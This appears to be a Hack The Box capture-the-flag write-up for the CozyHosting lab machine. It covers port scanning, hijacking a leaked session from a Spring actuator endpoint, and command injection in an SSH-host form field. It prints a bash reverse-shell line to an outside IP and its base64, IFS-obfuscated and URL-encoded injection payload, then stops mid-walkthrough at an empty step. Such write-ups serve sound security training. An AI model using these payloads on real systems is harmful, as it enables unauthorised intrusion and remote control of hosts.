# CozyHosting
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fa4c16d1-f3fe-47c6-810f-466d37c566a6)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.230 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 22:59 PDT
Nmap scan report for 10.10.11.230
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds
```

1. Based from the nmap results, the machine runs a webapp and opens ssh logins.

> WEBAPP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd9b7161-dbf0-4b00-b073-ef80301da3e2)


2. The wappalyzer itself shows us minimum info (for version).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1850a964-0b31-4a53-961a-1beee364802c)


3. Hence i ran dirsearch to list all directories or files available for this webapp.

> RESULTS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5697fb2f-fb43-476f-8efc-705146d76b30)


4. `admin` page and `actuator` directory should be our interest here.
5. Opens `actuator/sessions` shall resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/617cbf55-e5f0-470d-a54c-53965f5817bb)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e95e9939-f036-4f73-af4a-6a7330e23f2c)


6. Noticed there's a user session with name `kanderson` (Informatin Disclosure).
7. Let's change our session to kanderson's, then refresh the page.

 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a7c8c241-4cfa-4d95-a058-7c0bdd8b7d4f)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fac50408-3393-41e8-8df3-b4d2f3cf9604)


8. Scrolling down you shall see an input box.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbbc52af-baf7-45d6-9dd8-036986c88b27)


9. This should be our interest. To identify what's the vuln, let's capture the request we send using burpsuite.
10. Let's just fill the hostname with our tun0 interface and leave username empty, we just want to know what response might the server give.

> IN BURPSUITE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c2035f5f-dcc6-41f9-9f08-2a892ecfe5ba)


11. Noticed the server responds an error for the ssh command.
12. This make it clear, that the vuln should be related to command injection.
13. The idea is using basic bash reverse shell payload:

> BASH REVERSE SHELL PAYLOAD

```txt
bash -i >& /dev/tcp/10.10.16.14/1337 0>&1
```

> ENCODE IT TO BASE64 (adding -w 0, to make sure the output is a single line command)

```
echo "bash -i >& /dev/tcp/10.10.16.14/1337 0>&1" | base64 -w 0
```

> RESULT

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK
```

14. Great! Now for the final payload, because we want the server to decode our payload first then execute it, hence we use `base64 -d`.
15. But again, we need to encode it again with `url-encode` to terminate all the spaces.
16. The best practice is to use --> `${IFS%??}` to avoid spaces or other characters that may be treated as delimiters by the shell.
17. Then we url-encode the payload, set listener and send our payload.

> PAYLOAD

```
Original one:

echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK" | base64 -d | bash;

Adding ${IFS%??} to covering whitespaces

;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

URL-ENCODE:

%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D%2Dd%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d7f115a-0819-4aa5-b627-3d54677ed0cd)


18. At this point we can't get user flag, because we're not having the shell as "josh".

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a925e28b-c55b-4833-b19a-99e927f38459)


19. Noticed there's a .jar file which might be our interest.
20. Let's setup a python server at the remote server and download the file to our local machine.

#### NOTES: setup python server at port other than 80.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1b6709ea-e312-4421-8cce-40996c53d1df)


21. 






